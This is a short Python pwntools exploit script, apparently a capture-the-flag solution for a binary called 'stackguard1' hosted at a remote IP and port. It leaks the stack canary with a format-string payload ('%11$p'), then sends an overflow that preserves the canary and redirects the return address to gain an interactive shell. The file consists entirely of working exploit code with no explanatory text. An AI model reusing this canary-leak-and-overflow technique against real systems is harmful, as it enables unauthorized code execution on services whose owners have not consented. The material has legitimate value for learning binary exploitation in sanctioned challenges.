from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
execve = 0x04010c0
pop_rdi_ret = 0x0401343
bin_sh = 0x402004
#p = process('./stackguard1')
p = remote('123.57.230.48',12344)
payload1 = '%11$p'
p.sendline(payload1)
canary=int(p.recv(),16)
print canary
p.sendline('a'*0x28+p64(canary)+'a'*8+p64(0x4011d6))
#gdb.attach(p,'b main')
p.interactive()